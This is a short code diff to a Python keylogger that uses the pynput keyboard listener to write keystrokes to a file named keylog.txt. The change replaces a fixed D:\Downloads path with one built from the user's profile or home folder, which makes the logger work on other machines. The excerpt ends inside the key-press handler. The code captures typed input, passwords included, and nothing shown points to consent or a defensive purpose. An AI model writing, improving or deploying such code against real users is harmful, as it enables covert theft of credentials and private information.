@@ -2,10 +2,8 @@ from pynput import keyboard
 import datetime
 import os
 
-log_file = r"D:\Downloads\keylog.txt"
-
-if not os.path.exists(os.path.dirname(log_file)):
-    os.makedirs(os.path.dirname(log_file))
+user_profile = os.environ.get("USERPROFILE") or os.environ.get("HOME")
+log_file = os.path.join(user_profile, "Documents", "keylog.txt")
 
 def on_press(key):
     try:
